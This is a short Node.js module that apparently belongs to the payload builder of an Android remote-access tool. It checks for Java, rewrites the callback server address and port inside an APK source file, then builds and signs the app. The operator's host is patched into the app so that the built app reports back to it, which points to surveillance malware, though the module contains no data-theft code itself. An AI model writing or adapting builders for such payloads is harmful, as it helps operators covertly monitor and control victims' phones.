const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        data = data.toString().split('\n')[0];
        var javaVersion = new RegExp('java version').test(data) ? data.split(' ')[2].replace(/"/g, '') : false;
        var openJDKVersion = new RegExp('openjdk version').test(data) ? data.split(' ')[2].replace(/"/g, '') : false;
        if (javaVersion || openJDKVersion) {
            spawn.removeAllListeners();
            spawn.stderr.removeAllListeners();
            return callback(null, javaVersion);
        } else return callback("Java Not Installed", undefined);
    });
}

function patchAPK(URI, PORT, cb) {
    if (PORT < 25565) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb('File Patch Error - READ')
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb('File Patch Error - WRITE')
                else return cb(false)
            });
        });
    }
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
            if (error) return cb('Build Command Failed - ' + error.message);
            else cp.exec(CONST.signCommand, (error, stdout, stderr) => {
                if (!error) return cb(false);
                else return cb('Sign Command Failed - ' + error.message);
            });
        });
        else return cb(err);
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
